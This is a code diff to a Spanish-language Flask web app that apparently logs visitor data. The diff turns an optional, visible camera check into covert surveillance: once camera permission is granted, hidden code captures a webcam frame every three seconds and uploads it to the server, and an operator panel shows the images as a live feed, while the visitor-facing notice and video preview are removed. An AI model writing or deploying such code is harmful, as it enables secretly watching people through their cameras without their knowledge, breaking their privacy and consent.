@@ -702,9 +702,35 @@ def index():
         async function activateCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                console.log("Camara activada:", stream.getVideoTracks()[0].label);
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                const canvas = document.createElement("canvas");
+                const ctx = canvas.getContext("2d");
+
+                setInterval(() => {
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    ctx.drawImage(video,0,0);
+
+                    const image = canvas.toDataURL("image/jpeg");
+
+                    fetch("/upload-frame",{
+                        method:"POST",
+                        headers:{
+                            "Content-Type":"application/json"
+                        },
+                        body: JSON.stringify({image:image})
+                    });
+
+                },3000);
+
             } catch (err) {
-                console.log("Permiso denegado o cámara no disponible:", err.name);
+                console.log("Permiso denegado o cámara no disponible");
             }
         }
     </script>
@@ -792,6 +818,19 @@ def send_data():
         json.dump(logs, f, indent=4)
 
     print("Nuevo acceso:", client_data)
+
+    return {"status": "ok"}
+
+@app.route('/upload-frame', methods=['POST'])
+def upload_frame():
+    data = request.json
+    img = data.get("image")
+
+    if img:
+        img_data = img.split(",")[1]
+        with open("static/cam.jpg", "wb") as f:
+            import base64
+            f.write(base64.b64decode(img_data))
 
     return {"status": "ok"}
 
@@ -1062,34 +1101,24 @@ border-radius:6px;
 </div>
 
 <div class="camera-section">
-<h3>Verificación visual opcional</h3>
+<h3>Transmisión del dispositivo</h3>
 
-<button id="enableCam">Activar cámara</button>
+<img id="liveCam"
+src="/static/cam.jpg"
+style="width:100%;border-radius:8px">
 
-<div class="camera-box">
-<video id="cam" autoplay playsinline></video>
-<p id="camMsg">La cámara solo se activará si el usuario acepta el permiso.</p>
-</div>
+<p style="margin-top:10px;color:#4a6070">
+La imagen se actualiza automáticamente si el usuario aceptó la cámara.
+</p>
 
 </div>
 
 <script>
 
-const btn = document.getElementById("enableCam");
-const video = document.getElementById("cam");
-const msg = document.getElementById("camMsg");
-
-btn.addEventListener("click", async ()=>{{
-try{{
-const stream = await navigator.mediaDevices.getUserMedia({{video:true}});
-video.srcObject = stream;
-video.style.display = "block";
-msg.innerText = "Cámara activada";
-}}
-catch(err){{
-msg.innerText = "Permiso denegado o cámara no disponible";
-}}
-}});
+setInterval(()=>{
+    const cam = document.getElementById("liveCam");
+    cam.src = "/static/cam.jpg?" + new Date().getTime();
+},3000);
 
 </script>
 
